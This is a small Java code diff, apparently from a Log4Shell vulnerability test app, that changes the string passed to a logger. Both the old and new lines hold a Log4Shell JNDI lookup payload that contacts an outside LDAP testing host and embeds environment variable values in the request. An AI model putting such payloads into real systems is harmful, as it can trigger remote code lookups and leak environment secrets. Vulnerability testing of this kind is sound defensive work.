@@ -9,8 +9,9 @@ public class App {
 
     private static final Logger logger = LogManager.getRootLogger();
 
-    public static void main( String[] args ) {
+    public static void main(String[] args ) {
         Configurator.setAllLevels(logger.getName(), Level.ALL);
-        logger.error("${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:MAX_SIZE}:${env:MAX_SIZE}/47ad5d60-9894-445e-aa17-0f573a2a3fdf}");
+        logger.error("${jndi:ldap://log4shell.huntress.com:1389/appName=${env:appName}/da4b0d7c-ddf4-4430-930b-3df93660840d}");
+        DependencyApp.runTheLog();
     }
 }
